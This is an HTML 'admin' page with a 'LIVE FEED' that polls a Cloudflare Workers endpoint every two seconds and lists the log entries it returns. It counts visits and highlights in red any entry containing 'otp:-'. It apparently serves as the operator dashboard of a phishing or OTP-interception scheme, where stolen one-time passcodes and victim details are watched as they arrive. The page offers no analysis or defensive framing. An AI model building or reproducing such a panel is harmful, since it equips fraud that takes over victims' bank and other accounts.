<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Strict Left Admin</title>
    <style>
        /* Extreme Reset - Force Left */
        * { 
            margin: 0 !important; 
            padding: 0 !important; 
            box-sizing: border-box !important; 
            text-align: left !important;
            font-family: 'Arial', sans-serif;
        }

        body { 
            background-color: #ffffff; 
            padding: 10px !important; /* Sirf body mein thoda gap taaki chipak na jaye screen se */
        }

        .header {
            width: 100%;
            padding-bottom: 10px !important;
            border-bottom: 2px solid #000;
            margin-bottom: 15px !important;
            display: flex !important;
            justify-content: space-between !important;
        }

        /* Data List */
        #logsDisplay {
            width: 100%;
            display: block !important;
        }

        /* Minimal Line Style */
        .log-entry {
            display: block !important;
            width: 100%;
            padding: 8px 0 !important; /* Upar niche gap */
            border-bottom: 1px solid #ccc; /* Niche patli line */
            color: #000000;
            font-weight: 900; /* Extra Bold */
            font-size: 16px;
            line-height: 1.4;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .time {
            display: block !important;
            font-size: 10px;
            color: #777;
            font-weight: 400;
            margin-top: 4px !important;
        }

        /* OTP highlight - Sirf Text Red */
        .is-otp { color: #ff0000 !important; }
    </style>
</head>
<body>

    <div class="header">
        <h1 style="font-size: 14px;">LIVE FEED</h1>
        <span id="vCount" style="background:#000; color:#fff; padding:2px 8px; font-weight:900;">0</span>
    </div>

    <div id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                if (JSON.stringify(data) === lastHash) return;
                lastHash = JSON.stringify(data);

                const display = document.getElementById('logsDisplay');
                document.getElementById('vCount').innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    // Front-end par bhi trim kar dete hain safety ke liye
                    let cleanDetail = log.detail.trim();
                    let otpClass = cleanDetail.toLowerCase().includes("otp:-") ? "is-otp" : "";

                    return `
                        <div class="log-entry ${otpClass}">
                            ${cleanDetail}
                            <span class="time">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');
            } catch (e) { console.log("Sync..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
